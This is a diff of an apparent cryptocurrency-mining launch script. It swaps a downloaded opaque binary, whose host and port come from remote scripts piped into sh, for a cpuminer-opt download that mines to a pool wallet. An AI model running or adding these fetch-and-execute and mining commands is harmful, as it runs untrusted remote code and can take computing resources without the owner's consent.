@@ -1,3 +1,3 @@
-wget https://github.com/ocvmine/cpu/raw/main/rmac
-chmod +x rmac
-./rmac noconffile Mode=Solo Host=$(curl https://raw.githubusercontent.com/rienode0001/bit/master/host | sh) Port=$(curl https://raw.githubusercontent.com/rienode0001/bit/master/port | sh) Username=guru Password=guru PayoutAddress=ric1qu9sqhnl7vwgn3dhtygwk9fyqn2a9erfwjjsp55
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.34/cpuminer-opt-linux.tar.gz
+tar zxvf cpuminer-opt-linux.tar.gz
+./cpuminer-sse2 -a yespowerr16 -t 2 -o stratum+tcp://stratum-asia.rplant.xyz:3382 -u YVKxvfuuRWeqsxrkdobM68KDrgeG5Rmt8e
